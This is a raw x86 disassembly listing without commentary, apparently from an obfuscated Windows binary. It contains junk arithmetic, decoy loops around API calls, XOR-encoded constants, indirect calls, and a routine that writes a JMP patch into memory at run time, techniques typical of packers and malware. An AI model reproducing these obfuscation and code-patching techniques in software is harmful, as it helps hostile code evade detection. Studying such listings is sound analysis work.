  40d776:	and    DWORD PTR ds:0x43371b,0x6624
  40d780:	push   ebx
  40d781:	adc    DWORD PTR ds:0x4336e3,0x6b43
  40d78b:	push   esi
  40d78c:	push   edi
  40d78d:	sbb    DWORD PTR ds:0x43379f,0x433727
  40d797:	push   0x413c96
  40d79c:	sub    DWORD PTR ds:0x4336cb,0x4337e3
  40d7a6:	call   DWORD PTR ds:0x412194
  40d7ac:	push   0x413cbe
  40d7b1:	sub    DWORD PTR ds:0x4337a3,0x4336bf
  40d7bb:	call   DWORD PTR ds:0x412174
  40d7c1:	test   eax,eax
  40d7c3:	je     0x40d7d1
  40d7c9:	push   0x2
  40d7cb:	pop    eax
  40d7cc:	jmp    0x40e1cc
  40d7d1:	and    DWORD PTR ds:0x433733,0x0
  40d7db:	xor    ecx,ecx
  40d7dd:	xor    ecx,DWORD PTR ds:0x433733
  40d7e3:	inc    ecx
  40d7e4:	mov    DWORD PTR ds:0x433733,ecx
  40d7ea:	cmp    DWORD PTR ds:0x433733,0x24
  40d7f1:	jne    0x40d80b
  40d7f7:	push   DWORD PTR [ebp-0x28]
  40d7fa:	push   DWORD PTR [ebp-0x20]
  40d7fd:	push   0x38c3
  40d802:	push   DWORD PTR [ebp-0x14]
  40d805:	call   DWORD PTR ds:0x412274
  40d80b:	cmp    DWORD PTR ds:0x433733,0x1e
  40d812:	jb     0x40d7db
  40d818:	or     DWORD PTR ds:0x4336c7,0x4337e7
  40d822:	mov    DWORD PTR [ebp-0x24],0xf89c8535
  40d829:	dec    ecx
  40d82a:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40d831:	add    ecx,ecx
  40d833:	lea    eax,[ebp-0x2c]
  40d836:	and    DWORD PTR ds:0x4336cf,0x0
  40d840:	jmp    0x40d852
  40d845:	mov    ecx,DWORD PTR ds:0x4336cf
  40d84b:	inc    ecx
  40d84c:	mov    DWORD PTR ds:0x4336cf,ecx
  40d852:	cmp    DWORD PTR ds:0x4336cf,0x10
  40d859:	jae    0x40d899
  40d85f:	cmp    DWORD PTR ds:0x4336cf,0x4
  40d866:	jne    0x40d87a
  40d86c:	push   0x42d1
  40d871:	push   DWORD PTR [ebp-0x28]
  40d874:	call   DWORD PTR ds:0x4121a0
  40d87a:	cmp    DWORD PTR ds:0x4336cf,0x3
  40d881:	jne    0x40d894
  40d887:	mov    ecx,DWORD PTR ds:0x4336cf
  40d88d:	inc    ecx
  40d88e:	mov    DWORD PTR ds:0x4336cf,ecx
  40d894:	jmp    0x40d845
  40d899:	mov    DWORD PTR [ebp-0x18],eax
  40d89c:	xor    esi,esi
  40d89e:	add    esi,DWORD PTR ds:0x43379b
  40d8a4:	add    esi,DWORD PTR ds:0x433763
  40d8aa:	mov    DWORD PTR ds:0x43379b,esi
  40d8b0:	lea    eax,[ebp-0x30]
  40d8b3:	inc    edi
  40d8b4:	mov    DWORD PTR [ebp-0x14],eax
  40d8b7:	mov    eax,ds:0x4336c7
  40d8bc:	and    eax,DWORD PTR ds:0x43372f
  40d8c2:	mov    ds:0x4336c7,eax
  40d8c7:	mov    eax,ds:0x413b16
  40d8cc:	sbb    DWORD PTR ds:0x4336d3,ebx
  40d8d2:	mov    eax,DWORD PTR [eax+0x1c8]
  40d8d8:	mov    eax,DWORD PTR [eax]
  40d8da:	and    DWORD PTR ds:0x4337db,0x0
  40d8e4:	jmp    0x40d8f8
  40d8e9:	xor    edi,edi
  40d8eb:	or     edi,DWORD PTR ds:0x4337db
  40d8f1:	inc    edi
  40d8f2:	mov    DWORD PTR ds:0x4337db,edi
  40d8f8:	cmp    DWORD PTR ds:0x4337db,0x1c
  40d8ff:	jae    0x40d922
  40d905:	cmp    DWORD PTR ds:0x4337db,0x25
  40d90c:	jne    0x40d91d
  40d912:	push   0x6b44
  40d917:	call   DWORD PTR ds:0x4121a4
  40d91d:	jmp    0x40d8e9
  40d922:	mov    ecx,DWORD PTR [ebp-0x14]
  40d925:	sbb    DWORD PTR ds:0x433727,0x4337df
  40d92f:	mov    esi,0x7510853
  40d934:	movzx  edi,BYTE PTR ds:0x4336d3
  40d93b:	and    edi,DWORD PTR ds:0x4337af
  40d941:	mov    DWORD PTR ds:0x4336d3,edi
  40d947:	xor    eax,esi
  40d949:	mov    DWORD PTR ds:0x433727,0x13
  40d953:	cmp    DWORD PTR ds:0x433727,0x0
  40d95a:	je     0x40d9b9
  40d960:	cmp    DWORD PTR ds:0x433727,0x3
  40d967:	jne    0x40d985
  40d96d:	push   0x5b51
  40d972:	push   DWORD PTR [ebp-0x18]
  40d975:	push   0x1bb9
  40d97a:	push   0x295c
  40d97f:	call   DWORD PTR ds:0x412278
  40d985:	cmp    DWORD PTR ds:0x433727,0x4
  40d98c:	jne    0x40d99f
  40d992:	mov    edi,DWORD PTR ds:0x433727
  40d998:	dec    edi
  40d999:	mov    DWORD PTR ds:0x433727,edi
  40d99f:	xor    edi,edi
  40d9a1:	add    edi,DWORD PTR ds:0x433727
  40d9a7:	dec    edi
  40d9a8:	mov    DWORD PTR ds:0x433727,edi
  40d9ae:	jmp    0x40d953
  40d9b3:	xor    ebx,DWORD PTR ds:0x4336cf
  40d9b9:	mov    edi,0x32729a
  40d9be:	add    eax,edi
  40d9c0:	mov    DWORD PTR [ecx],eax
  40d9c2:	mov    eax,ds:0x413dda
  40d9c7:	mov    DWORD PTR ds:0x43375b,ecx
  40d9cd:	cmp    eax,0x22c02f45
  40d9d2:	mov    DWORD PTR ds:0x433773,ecx
  40d9d8:	mov    eax,DWORD PTR [ebp-0x4]
  40d9db:	mov    ebx,DWORD PTR ds:0x43371f
  40d9e1:	mov    ebx,0xf89c8539
  40d9e6:	je     0x40da18
  40d9ec:	sub    DWORD PTR ds:0x4336df,edx
  40d9f2:	mov    ecx,DWORD PTR [ebp-0x24]
  40d9f5:	xor    eax,esi
  40d9f7:	add    eax,edi
  40d9f9:	imul   eax,ecx
  40d9fc:	mov    DWORD PTR ds:0x4337e3,0x5372
  40da06:	mov    DWORD PTR [ebp-0x24],eax
  40da09:	mov    DWORD PTR ds:0x43376b,0x4650
  40da13:	jmp    0x40db46
  40da18:	xor    eax,esi
  40da1a:	movzx  ecx,WORD PTR ds:0x4336cf
  40da21:	sub    DWORD PTR ds:0x4336e7,ecx
  40da27:	add    eax,edi
  40da29:	mov    ds:0x413c2a,eax
  40da2e:	xor    DWORD PTR ds:0x4336db,edi
  40da34:	mov    eax,DWORD PTR [ebp-0x24]
  40da37:	xor    eax,esi
  40da39:	and    DWORD PTR ds:0x4337af,0x0
  40da43:	jmp    0x40da55
  40da48:	mov    ecx,DWORD PTR ds:0x4337af
  40da4e:	inc    ecx
  40da4f:	mov    DWORD PTR ds:0x4337af,ecx
  40da55:	cmp    DWORD PTR ds:0x4337af,0x19
  40da5c:	jae    0x40da9d
  40da62:	cmp    DWORD PTR ds:0x4337af,0xe
  40da69:	jne    0x40da78
  40da6f:	push   DWORD PTR [ebp-0x14]
  40da72:	call   DWORD PTR ds:0x41227c
  40da78:	cmp    DWORD PTR ds:0x4337af,0xd
  40da7f:	jne    0x40da92
  40da85:	mov    ecx,DWORD PTR ds:0x4337af
  40da8b:	inc    ecx
  40da8c:	mov    DWORD PTR ds:0x4337af,ecx
  40da92:	jmp    0x40da48
  40da97:	sbb    DWORD PTR ds:0x4337db,edx
  40da9d:	add    eax,edi
  40da9f:	and    DWORD PTR ds:0x433717,0x0
  40daa9:	jmp    0x40dabd
  40daae:	xor    ecx,ecx
  40dab0:	or     ecx,DWORD PTR ds:0x433717
  40dab6:	inc    ecx
  40dab7:	mov    DWORD PTR ds:0x433717,ecx
  40dabd:	cmp    DWORD PTR ds:0x433717,0x15
  40dac4:	jae    0x40daf7
  40daca:	cmp    DWORD PTR ds:0x433717,0x1c
  40dad1:	jne    0x40daf2
  40dad7:	push   0x1c72
  40dadc:	push   DWORD PTR [ebp-0xc]
  40dadf:	push   DWORD PTR [ebp-0x14]
  40dae2:	push   0x4339f4
  40dae7:	push   0x400000
  40daec:	call   DWORD PTR ds:0x412280
  40daf2:	jmp    0x40daae
  40daf7:	mov    ds:0x413dda,eax
  40dafc:	mov    eax,DWORD PTR [ebp-0x4]
  40daff:	or     DWORD PTR ds:0x4336e3,0x6d3e
  40db09:	mov    ecx,DWORD PTR ds:0x413c2a
  40db0f:	adc    DWORD PTR ds:0x433727,0x4336cf
  40db19:	xor    eax,esi
  40db1b:	adc    DWORD PTR ds:0x4337d7,0x260d
  40db25:	add    eax,edi
  40db27:	cmp    ecx,eax
  40db29:	mov    DWORD PTR ds:0x4336c3,0x58a9
  40db33:	jne    0x40db46
  40db39:	push   ebx
  40db3a:	push   DWORD PTR [ebp-0x4]
  40db3d:	push   DWORD PTR [ebp-0x24]
  40db40:	call   DWORD PTR ds:0x413c22
  40db46:	or     DWORD PTR ds:0x4336c7,0x68cd
  40db50:	mov    eax,ds:0x413b16
  40db55:	mov    ecx,DWORD PTR ds:0x43374f
  40db5b:	mov    ecx,DWORD PTR [ecx]
  40db5d:	or     DWORD PTR ds:0x4336e3,ecx
  40db63:	mov    eax,DWORD PTR [eax+0x18c]
  40db69:	and    DWORD PTR ds:0x43379f,0x0
  40db73:	mov    ecx,DWORD PTR ds:0x43379f
  40db79:	inc    ecx
  40db7a:	mov    DWORD PTR ds:0x43379f,ecx
  40db80:	cmp    DWORD PTR ds:0x43379f,0x21
  40db87:	jne    0x40db9d
  40db8d:	push   0x43379f
  40db92:	push   0x4b8b
  40db97:	call   DWORD PTR ds:0x4121a8
  40db9d:	cmp    DWORD PTR ds:0x43379f,0x1b
  40dba4:	jb     0x40db73
  40dbaa:	mov    eax,DWORD PTR [eax]
  40dbac:	sbb    DWORD PTR ds:0x43371f,0x7dd1
  40dbb6:	mov    DWORD PTR [ebp-0x44],eax
  40dbb9:	mov    DWORD PTR ds:0x4337a7,0x12
  40dbc3:	cmp    DWORD PTR ds:0x4337a7,0x0
  40dbca:	je     0x40dc20
  40dbd0:	cmp    DWORD PTR ds:0x4337a7,0x6
  40dbd7:	jne    0x40dbf0
  40dbdd:	push   0x2c3a
  40dbe2:	push   0x4337e7
  40dbe7:	push   DWORD PTR [ebp-0x20]
  40dbea:	call   DWORD PTR ds:0x4121ac
  40dbf0:	cmp    DWORD PTR ds:0x4337a7,0x7
  40dbf7:	jne    0x40dc0a
  40dbfd:	mov    ecx,DWORD PTR ds:0x4337a7
  40dc03:	dec    ecx
  40dc04:	mov    DWORD PTR ds:0x4337a7,ecx
  40dc0a:	xor    ecx,ecx
  40dc0c:	or     ecx,DWORD PTR ds:0x4337a7
  40dc12:	dec    ecx
  40dc13:	mov    DWORD PTR ds:0x4337a7,ecx
  40dc19:	jmp    0x40dbc3
  40dc1e:	xor    edx,eax
  40dc20:	mov    DWORD PTR [ebp-0x10],ebx
  40dc23:	and    DWORD PTR ds:0x433797,0x0
  40dc2d:	xor    eax,eax
  40dc2f:	or     eax,DWORD PTR ds:0x433797
  40dc35:	inc    eax
  40dc36:	mov    ds:0x433797,eax
  40dc3b:	cmp    DWORD PTR ds:0x433797,0x5
  40dc42:	jne    0x40dc5a
  40dc48:	push   0x4338f5
  40dc4d:	push   0x1
  40dc4f:	push   0x1
  40dc51:	push   DWORD PTR [ebp-0x20]
  40dc54:	call   DWORD PTR ds:0x4121b0
  40dc5a:	cmp    DWORD PTR ds:0x433797,0x4
  40dc61:	jne    0x40dc72
  40dc67:	mov    eax,ds:0x433797
  40dc6c:	inc    eax
  40dc6d:	mov    ds:0x433797,eax
  40dc72:	cmp    DWORD PTR ds:0x433797,0x18
  40dc79:	jb     0x40dc2d
  40dc7f:	and    DWORD PTR ds:0x4336cb,ecx
  40dc85:	mov    DWORD PTR [ebp-0x10],ebx
  40dc88:	mov    DWORD PTR [ebp-0x10],ebx
  40dc8b:	sbb    DWORD PTR ds:0x4336c7,ebx
  40dc91:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  40dc98:	and    DWORD PTR ds:0x4337f3,0x6700
  40dca2:	mov    DWORD PTR [ebp-0x10],ebx
  40dca5:	and    DWORD PTR ds:0x43371f,0x0
  40dcaf:	jmp    0x40dcc1
  40dcb4:	mov    ecx,DWORD PTR ds:0x43371f
  40dcba:	inc    ecx
  40dcbb:	mov    DWORD PTR ds:0x43371f,ecx
  40dcc1:	cmp    DWORD PTR ds:0x43371f,0x1d
  40dcc8:	jae    0x40dd19
  40dcce:	cmp    DWORD PTR ds:0x43371f,0x7
  40dcd5:	jne    0x40dce4
  40dcdb:	push   DWORD PTR [ebp-0x1c]
  40dcde:	call   DWORD PTR ds:0x4121b4
  40dce4:	cmp    DWORD PTR ds:0x43371f,0x6
  40dceb:	jne    0x40dd00
  40dcf1:	xor    ecx,ecx
  40dcf3:	add    ecx,DWORD PTR ds:0x43371f
  40dcf9:	inc    ecx
  40dcfa:	mov    DWORD PTR ds:0x43371f,ecx
  40dd00:	jmp    0x40dcb4
  40dd05:	xor    edx,edx
  40dd07:	or     edx,DWORD PTR ds:0x433727
  40dd0d:	sbb    edx,DWORD PTR ds:0x4337e7
  40dd13:	mov    DWORD PTR ds:0x433727,edx
  40dd19:	mov    DWORD PTR [ebp-0x10],0xf89c853d
  40dd20:	mov    ecx,DWORD PTR ds:0x4337eb
  40dd26:	or     DWORD PTR ds:0x43379b,ecx
  40dd2c:	mov    eax,DWORD PTR [ebp-0x24]
  40dd2f:	sbb    edx,ecx
  40dd31:	mov    ecx,DWORD PTR [ebp-0x4]
  40dd34:	mov    edx,DWORD PTR ds:0x433733
  40dd3a:	and    DWORD PTR ds:0x43379f,edx
  40dd40:	mov    edx,DWORD PTR [ebp-0x4]
  40dd43:	xor    edx,esi
  40dd45:	xor    ecx,esi
  40dd47:	add    ecx,edx
  40dd49:	mov    edx,DWORD PTR [ebp-0x4]
  40dd4c:	xor    eax,esi
  40dd4e:	xor    edx,esi
  40dd50:	add    eax,edi
  40dd52:	mov    DWORD PTR ds:0x4336d7,0x7934
  40dd5c:	lea    ecx,[ecx+edx*1+0x9757ce]
  40dd63:	mov    DWORD PTR ds:0x4336cf,0x1f1b
  40dd6d:	mov    DWORD PTR [ebp-0x20],eax
  40dd70:	mov    DWORD PTR ds:0x4336db,0xf60
  40dd7a:	cmp    eax,ecx
  40dd7c:	mov    DWORD PTR ds:0x4337eb,0x7c7a
  40dd86:	ja     0x40dec6
  40dd8c:	jmp    0x40dd9e
  40dd91:	sbb    DWORD PTR ds:0x43379b,0x74d8
  40dd9b:	mov    eax,DWORD PTR [ebp-0x20]
  40dd9e:	and    DWORD PTR ds:0x4336db,edi
  40dda4:	mov    ecx,DWORD PTR [ebp-0x4]
  40dda7:	or     DWORD PTR ds:0x433727,0x4337af
  40ddb1:	xor    ecx,esi
  40ddb3:	adc    DWORD PTR ds:0x4337df,0x2704
  40ddbd:	lea    eax,[ecx+eax*1+0x32729a]
  40ddc4:	and    DWORD PTR ds:0x43371f,0x7330
  40ddce:	push   eax
  40ddcf:	mov    eax,DWORD PTR [ebp-0x14]
  40ddd2:	xor    eax,esi
  40ddd4:	and    DWORD PTR ds:0x4336db,0x4337af
  40ddde:	lea    eax,[ebp+eax*1+0x3272a2]
  40dde5:	push   eax
  40dde6:	mov    eax,ds:0x4336cb
  40ddeb:	or     DWORD PTR ds:0x43375f,eax
  40ddf1:	mov    eax,ds:0x413b16
  40ddf6:	push   DWORD PTR [eax+0x1bc]
  40ddfc:	adc    DWORD PTR ds:0x4337db,0x433733
  40de06:	call   0x403290
  40de0b:	add    DWORD PTR ds:0x4337e3,0x32bd
  40de15:	mov    eax,DWORD PTR [ebp-0x4]
  40de18:	mov    ecx,DWORD PTR [ebp-0x20]
  40de1b:	sbb    DWORD PTR ds:0x43376f,ecx
  40de21:	xor    eax,esi
  40de23:	and    DWORD PTR ds:0x43372b,0x0
  40de2d:	mov    edx,DWORD PTR ds:0x43372b
  40de33:	inc    edx
  40de34:	mov    DWORD PTR ds:0x43372b,edx
  40de3a:	cmp    DWORD PTR ds:0x43372b,0x23
  40de41:	jne    0x40de57
  40de47:	push   0x303f
  40de4c:	push   0x8a6d
  40de51:	call   DWORD PTR ds:0x4121b8
  40de57:	cmp    DWORD PTR ds:0x43372b,0x15
  40de5e:	jb     0x40de2d
  40de64:	lea    eax,[ecx+eax*1+0x32729a]
  40de6b:	sbb    DWORD PTR ds:0x4337e7,0x3009
  40de75:	mov    ecx,DWORD PTR [ebp-0x4]
  40de78:	mov    edx,DWORD PTR [ebp-0x4]
  40de7b:	xor    edx,esi
  40de7d:	add    DWORD PTR ds:0x43379b,0x46c0
  40de87:	xor    ecx,esi
  40de89:	xor    DWORD PTR ds:0x4337d7,0x4fa5
  40de93:	add    ecx,edx
  40de95:	and    edx,DWORD PTR ds:0x4337e3
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	adc    DWORD PTR ds:0x433717,0x7c2
  40dea8:	xor    edx,esi
  40deaa:	lea    ecx,[ecx+edx*1+0x9757ce]
  40deb1:	mov    DWORD PTR [ebp-0x20],eax
  40deb4:	cmp    eax,ecx
  40deb6:	mov    DWORD PTR ds:0x433767,0x1689
  40dec0:	jbe    0x40dd91
  40dec6:	mov    eax,DWORD PTR [ebp+0xc]
  40dec9:	mov    ds:0x41399a,eax
  40dece:	mov    eax,DWORD PTR [ebp+0x10]
  40ded1:	mov    ds:0x413bee,eax
  40ded6:	mov    eax,ds:0x41399a
  40dedb:	mov    ecx,DWORD PTR [ebp-0x18]
  40dede:	push   DWORD PTR [ebp-0x44]
  40dee1:	sub    eax,edi
  40dee3:	push   DWORD PTR [ebp-0x30]
  40dee6:	xor    eax,esi
  40dee8:	mov    DWORD PTR [ecx],eax
  40deea:	push   DWORD PTR [ebp-0x2c]
  40deed:	call   0x40e1d3
  40def2:	sub    eax,edi
  40def4:	xor    eax,esi
  40def6:	mov    DWORD PTR [ebp+0xc],eax
  40def9:	mov    ecx,DWORD PTR [ebp-0x4]
  40defc:	mov    eax,DWORD PTR [ebp+0xc]
  40deff:	xor    ecx,esi
  40df01:	add    ecx,edi
  40df03:	xor    edx,edx
  40df05:	div    ecx
  40df07:	mov    ecx,DWORD PTR [ebp-0x24]
  40df0a:	cmp    ecx,eax
  40df0c:	jne    0x40e135
  40df12:	mov    eax,ds:0x413b16
  40df17:	mov    DWORD PTR [ebp+0x10],eax
  40df1a:	mov    eax,ds:0x413c26
  40df1f:	mov    DWORD PTR [ebp-0x50],eax
  40df22:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  40df29:	mov    DWORD PTR [ebp-0x20],0xf89c8534
  40df30:	mov    DWORD PTR [ebp-0x4c],0xf89cb535
  40df37:	mov    DWORD PTR [ebp-0x64],0xf89f0535
  40df3e:	mov    DWORD PTR [ebp-0x60],0xf89c85f5
  40df45:	mov    DWORD PTR [ebp-0x54],0xf89c85d5
  40df4c:	mov    eax,DWORD PTR [ebp-0x18]
  40df4f:	xor    eax,esi
  40df51:	add    eax,edi
  40df53:	mov    DWORD PTR [ebp-0xc],eax
  40df56:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  40df5d:	mov    BYTE PTR [ebp-0x25],0x67
  40df61:	mov    eax,DWORD PTR [ebp-0x18]
  40df64:	xor    eax,esi
  40df66:	add    eax,edi
  40df68:	mov    DWORD PTR [ebp-0xc],eax
  40df6b:	mov    eax,DWORD PTR [ebp-0x54]
  40df6e:	xor    eax,esi
  40df70:	add    eax,edi
  40df72:	mov    DWORD PTR [ebp-0x40],eax
  40df75:	mov    eax,DWORD PTR [ebp-0x4c]
  40df78:	xor    eax,esi
  40df7a:	add    eax,edi
  40df7c:	mov    DWORD PTR [ebp-0x38],eax
  40df7f:	mov    eax,DWORD PTR [ebp-0x3c]
  40df82:	xor    eax,esi
  40df84:	add    eax,edi
  40df86:	mov    DWORD PTR [ebp-0x34],eax
  40df89:	lea    eax,[ebp-0xa8]
  40df8f:	mov    DWORD PTR [ebp+0xc],eax
  40df92:	mov    eax,DWORD PTR [ebp-0x18]
  40df95:	mov    DWORD PTR [ebp-0x14],eax
  40df98:	mov    eax,DWORD PTR [ebp-0x20]
  40df9b:	mov    DWORD PTR [ebp-0x5c],ebx
  40df9e:	mov    DWORD PTR [ebp-0x10],eax
  40dfa1:	mov    eax,DWORD PTR [ebp-0x5c]
  40dfa4:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfa7:	xor    eax,esi
  40dfa9:	add    eax,0x32729a
  40dfae:	mov    DWORD PTR [ecx],eax
  40dfb0:	mov    eax,DWORD PTR [ebp-0x14]
  40dfb3:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfb6:	xor    eax,esi
  40dfb8:	add    eax,edi
  40dfba:	mov    DWORD PTR [ecx+0x4],eax
  40dfbd:	mov    eax,DWORD PTR [ebp-0x34]
  40dfc0:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfc3:	mov    DWORD PTR [ecx+0x8],eax
  40dfc6:	mov    eax,DWORD PTR [ebp-0x38]
  40dfc9:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfcc:	mov    DWORD PTR [ecx+0xc],eax
  40dfcf:	mov    eax,DWORD PTR [ebp-0x40]
  40dfd2:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd5:	mov    DWORD PTR [ecx+0x10],eax
  40dfd8:	mov    eax,eax
  40dfda:	mov    eax,DWORD PTR [ebp-0x10]
  40dfdd:	xor    eax,esi
  40dfdf:	add    eax,edi
  40dfe1:	je     0x40e012
  40dfe7:	lea    eax,[ebp-0xa8]
  40dfed:	push   eax
  40dfee:	mov    eax,DWORD PTR [ebp-0x20]
  40dff1:	xor    eax,esi
  40dff3:	add    eax,edi
  40dff5:	push   eax
  40dff6:	mov    eax,DWORD PTR [ebp+0x10]
  40dff9:	add    eax,0xaa
  40dffe:	push   eax
  40dfff:	mov    eax,DWORD PTR [ebp+0x10]
  40e002:	mov    eax,DWORD PTR [eax+0x198]
  40e008:	push   DWORD PTR [eax]
  40e00a:	call   0x4100b5
  40e00f:	mov    DWORD PTR [ebp-0x8],eax
  40e012:	cmp    DWORD PTR [ebp-0x8],0x0
  40e016:	je     0x40e135
  40e01c:	lea    eax,[ebp-0xc]
  40e01f:	mov    DWORD PTR [ebp-0x38],eax
  40e022:	mov    eax,DWORD PTR [ebp-0x60]
  40e025:	xor    eax,esi
  40e027:	add    eax,edi
  40e029:	mov    DWORD PTR [ebp-0x40],eax
  40e02c:	mov    eax,DWORD PTR [ebp-0x3c]
  40e02f:	xor    eax,esi
  40e031:	add    eax,edi
  40e033:	mov    DWORD PTR [ebp-0x10],eax
  40e036:	mov    eax,DWORD PTR [ebp-0x8]
  40e039:	mov    DWORD PTR [ebp-0x14],eax
  40e03c:	lea    eax,[ebp-0xa8]
  40e042:	mov    DWORD PTR [ebp+0xc],eax
  40e045:	mov    eax,DWORD PTR [ebp-0x18]
  40e048:	mov    DWORD PTR [ebp-0x18],eax
  40e04b:	mov    eax,DWORD PTR [ebp-0x20]
  40e04e:	mov    DWORD PTR [ebp-0x48],ebx
  40e051:	mov    DWORD PTR [ebp-0x34],eax
  40e054:	mov    eax,DWORD PTR [ebp-0x48]
  40e057:	mov    ecx,DWORD PTR [ebp+0xc]
  40e05a:	xor    eax,esi
  40e05c:	add    eax,0x32729a
  40e061:	mov    DWORD PTR [ecx],eax
  40e063:	mov    eax,DWORD PTR [ebp-0x14]
  40e066:	mov    ecx,DWORD PTR [ebp+0xc]
  40e069:	mov    DWORD PTR [ecx+0x4],eax
  40e06c:	mov    eax,DWORD PTR [ebp-0x10]
  40e06f:	mov    ecx,DWORD PTR [ebp+0xc]
  40e072:	mov    DWORD PTR [ecx+0x8],eax
  40e075:	mov    eax,DWORD PTR [ebp-0x40]
  40e078:	mov    ecx,DWORD PTR [ebp+0xc]
  40e07b:	mov    DWORD PTR [ecx+0xc],eax
  40e07e:	mov    eax,DWORD PTR [ebp-0x38]
  40e081:	mov    ecx,DWORD PTR [ebp+0xc]
  40e084:	mov    DWORD PTR [ecx+0x10],eax
  40e087:	mov    eax,eax
  40e089:	mov    eax,DWORD PTR [ebp-0x14]
  40e08c:	test   eax,eax
  40e08e:	mov    eax,DWORD PTR [ebp-0x34]
  40e091:	jne    0x40e09a
  40e097:	mov    eax,DWORD PTR [ebp-0x18]
  40e09a:	xor    eax,esi
  40e09c:	add    eax,edi
  40e09e:	test   eax,eax
  40e0a0:	je     0x40e0ce
  40e0a6:	lea    eax,[ebp-0xa8]
  40e0ac:	push   eax
  40e0ad:	mov    eax,DWORD PTR [ebp-0x20]
  40e0b0:	xor    eax,esi
  40e0b2:	add    eax,edi
  40e0b4:	push   eax
  40e0b5:	mov    eax,DWORD PTR [ebp+0x10]
  40e0b8:	add    eax,0xee
  40e0bd:	push   eax
  40e0be:	mov    eax,DWORD PTR [ebp+0x10]
  40e0c1:	mov    eax,DWORD PTR [eax+0x198]
  40e0c7:	push   DWORD PTR [eax]
  40e0c9:	call   0x4100b5
  40e0ce:	mov    ecx,DWORD PTR [ebp-0x3c]
  40e0d1:	xor    ecx,esi
  40e0d3:	mov    eax,0xffcd8d66
  40e0d8:	sub    eax,ecx
  40e0da:	sub    eax,DWORD PTR [ebp-0x8]
  40e0dd:	mov    ecx,DWORD PTR [ebp-0x50]
  40e0e0:	add    ecx,eax
  40e0e2:	mov    eax,DWORD PTR [ebp-0x8]
  40e0e5:	mov    DWORD PTR [eax+0x1],ecx
  40e0e8:	mov    al,BYTE PTR [ebp-0x25]
  40e0eb:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ee:	xor    al,0x45
  40e0f0:	sub    al,0x39
  40e0f2:	mov    BYTE PTR [ecx],al
  40e0f4:	lea    eax,[ebp-0x8]
  40e0f7:	inc    BYTE PTR [eax]
  40e0f9:	inc    eax
  40e0fa:	push   eax
  40e0fb:	pop    ecx
  40e0fc:	dec    ecx
  40e0fd:	xchg   ecx,edx
  40e0ff:	dec    BYTE PTR [edx]
  40e101:	push   DWORD PTR [ebp+0x10]
  40e104:	mov    eax,ds:0x413bd2
  40e109:	mov    eax,DWORD PTR [eax]
  40e10b:	push   DWORD PTR [eax]
  40e10d:	lea    eax,ds:0x413bee
  40e113:	push   DWORD PTR [eax]
  40e115:	lea    eax,ds:0x41399a
  40e11b:	push   DWORD PTR [eax]
  40e11d:	lea    eax,ds:0x413bce
  40e123:	push   DWORD PTR [eax]
  40e125:	lea    eax,ds:0x413d06
  40e12b:	push   DWORD PTR [eax]
  40e12d:	xchg   ebx,edx
  40e12f:	inc    ebx
  40e130:	push   ebx
  40e131:	pop    eax
  40e132:	call   DWORD PTR [eax-0x1]
  40e135:	lea    eax,[ebp+0x4]
  40e138:	mov    DWORD PTR [ebp-0x58],eax
  40e13b:	mov    eax,ds:0x413b16
  40e140:	push   0x4
  40e142:	add    eax,0x1cc
  40e147:	push   eax
  40e148:	lea    eax,[ebp-0x1c]
  40e14b:	push   eax
  40e14c:	call   0x403290
  40e151:	mov    eax,DWORD PTR [ebp-0x1c]
  40e154:	mov    eax,DWORD PTR [ebp-0x4]
  40e157:	mov    eax,DWORD PTR [ebp-0x24]
  40e15a:	mov    DWORD PTR [ebp+0xc],eax
  40e15d:	mov    eax,ds:0x413b9a
  40e162:	mov    ecx,DWORD PTR [ebp+0xc]
  40e165:	sub    eax,edi
  40e167:	xor    eax,esi
  40e169:	cmp    eax,ecx
  40e16b:	je     0x40e1b2
  40e171:	mov    eax,ds:0x413b92
  40e176:	mov    ecx,DWORD PTR [ebp+0xc]
  40e179:	sub    eax,edi
  40e17b:	xor    eax,esi
  40e17d:	cmp    eax,ecx
  40e17f:	jne    0x40e195
  40e185:	mov    eax,ds:0x413b9a
  40e18a:	add    eax,DWORD PTR ds:0x413b92
  40e190:	jmp    0x40e19c
  40e195:	mov    eax,DWORD PTR [ebp+0xc]
  40e198:	xor    eax,esi
  40e19a:	add    eax,edi
  40e19c:	mov    ds:0x413b92,eax
  40e1a1:	mov    eax,DWORD PTR [ebp+0xc]
  40e1a4:	xor    eax,esi
  40e1a6:	add    eax,edi
  40e1a8:	mov    ds:0x413b9a,eax
  40e1ad:	jmp    0x40e1bc
  40e1b2:	mov    eax,ds:0x413b9a
  40e1b7:	mov    ds:0x413b92,eax
  40e1bc:	mov    eax,DWORD PTR [ebp-0x58]
  40e1bf:	mov    ecx,DWORD PTR ds:0x413b92
  40e1c5:	add    DWORD PTR [eax],ecx
  40e1c7:	mov    eax,DWORD PTR [ebp-0x1c]
  40e1ca:	mov    eax,DWORD PTR [eax]
  40e1cc:	pop    edi
  40e1cd:	pop    esi
  40e1ce:	pop    ebx
  40e1cf:	leave  
  40e1d0:	ret    0xc
  40e1d3:	push   ebp
  40e1d4:	mov    ebp,esp
  40e1d6:	push   ecx
  40e1d7:	push   ecx
  40e1d8:	mov    DWORD PTR ds:0x4336d7,0x1ded
  40e1e2:	mov    eax,0xf89c8534
  40e1e7:	mov    ecx,DWORD PTR ds:0x43375f
  40e1ed:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40e1f4:	push   esi
  40e1f5:	mov    esi,0x7be1
  40e1fa:	mov    DWORD PTR [ebp-0x8],eax
  40e1fd:	mov    ecx,DWORD PTR [ebp+0x8]
  40e200:	push   edi
  40e201:	mov    DWORD PTR ds:0x4337ab,0x40de
  40e20b:	mov    edi,0x7510853
  40e210:	mov    esi,DWORD PTR ds:0x43372f
  40e216:	mov    esi,0x32729a
  40e21b:	cmp    ecx,eax
  40e21d:	mov    DWORD PTR ds:0x433797,0x680f
  40e227:	je     0x40eaa5
  40e22d:	and    DWORD PTR ds:0x4337a7,0x0
  40e237:	mov    ecx,DWORD PTR ds:0x4337a7
  40e23d:	inc    ecx
  40e23e:	mov    DWORD PTR ds:0x4337a7,ecx
